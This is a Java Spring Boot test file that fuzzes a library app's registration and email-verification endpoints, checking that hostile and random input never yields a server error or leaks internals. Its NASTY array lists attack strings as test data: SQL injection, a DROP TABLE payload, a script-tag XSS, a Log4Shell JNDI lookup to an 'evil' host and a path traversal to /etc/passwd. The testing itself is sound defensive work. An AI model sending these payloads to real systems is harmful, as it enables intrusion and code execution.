package io.github.adamstac.libraryapp.users;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.adamstac.libraryapp.TestcontainersConfiguration;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Random;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.Import;

/** Random and malicious input must never crash the API (500) or leak internals. Fixed seed = reproducible. */
@Import({TestcontainersConfiguration.class, RegistrationTests.TestBeans.class})
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class HostileInputTests {

    private static final String[] NASTY = {
        "' OR '1'='1", "\"; DROP TABLE users; --", "<script>alert(1)</script>", "${jndi:ldap://evil/x}",
        "../../etc/passwd", "\u0000", "%00", "\u202Eevil", "a@b.c", "ar", "en", "😀", "مكتبة", "", " "
    };

    private final HttpClient client = HttpClient.newHttpClient();

    @Value("${local.server.port}")
    private int port;

    @Autowired
    private AuthRateLimitFilter rateLimitFilter;

    @Test
    void randomFieldValuesNeverCrashTheApi() throws Exception {
        Random random = new Random(20261023L);
        for (int i = 0; i < 150; i++) {
            rateLimitFilter.reset();
            String body = "{\"email\":" + json(randomText(random))
                    + ",\"password\":" + json(randomText(random))
                    + ",\"language\":" + json(randomText(random)) + "}";

            HttpResponse<String> response = post("/api/v1/auth/register", body, "application/json");

            assertThat(response.statusCode()).as(body).isIn(202, 400, 413);
            assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception").doesNotContain("trace");
        }
    }

    @Test
    void malformedRequestsAreRejectedCleanly() throws Exception {
        List<String> bodies = List.of(
                "", "{", "null", "[]", "42", "{\"email\":1}", "{\"email\":{}}", "<xml/>",
                "{\"email\":\"a@b.c\",\"password\":null,\"language\":\"en\"}",
                "{\"email\":\"a@b.c\",\"password\":\"" + "x".repeat(200) + "\",\"language\":\"en\"}",
                "{\"token\":[\"a\"]}");
        for (String body : bodies) {
            rateLimitFilter.reset();
            for (String path : List.of("/api/v1/auth/register", "/api/v1/auth/verify-email")) {
                HttpResponse<String> response = post(path, body, "application/json");

                assertThat(response.statusCode()).as(path + " " + body).isIn(400, 413);
                assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception");
            }
        }
    }

    @Test
    void wrongContentTypeIsRejected() throws Exception {
        HttpResponse<String> response = post("/api/v1/auth/register", "email=a@b.c", "text/plain");

        assertThat(response.statusCode()).isEqualTo(415);
    }

    private HttpResponse<String> post(String path, String body, String contentType) throws Exception {
        HttpRequest request = HttpRequest.newBuilder(URI.create("http://localhost:" + port + path))
                .header("Content-Type", contentType)
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .build();
        return client.send(request, HttpResponse.BodyHandlers.ofString());
    }

    private static String randomText(Random random) {
        if (random.nextInt(4) == 0) {
            return NASTY[random.nextInt(NASTY.length)];
        }
        int length = random.nextInt(random.nextInt(10) == 0 ? 400 : 40);
        StringBuilder text = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int codePoint;
            do {
                codePoint = switch (random.nextInt(4)) {
                    case 0 -> random.nextInt(0x20); // control characters
                    case 1 -> 0x0600 + random.nextInt(0x100); // Arabic block
                    case 2 -> random.nextInt(0x1FFFF); // anything, including emoji
                    default -> 0x20 + random.nextInt(0x5F); // printable ASCII
                };
            } while (codePoint >= 0xD800 && codePoint <= 0xDFFF);
            text.appendCodePoint(codePoint);
        }
        return text.toString();
    }

    private static String json(String value) {
        StringBuilder out = new StringBuilder("\"");
        value.codePoints().forEach(cp -> {
            if (cp == '"' || cp == '\\') {
                out.append('\\').appendCodePoint(cp);
            } else if (cp < 0x20) {
                out.append(String.format("\\u%04x", cp));
            } else {
                out.appendCodePoint(cp);
            }
        });
        return out.append('"').toString();
    }
}
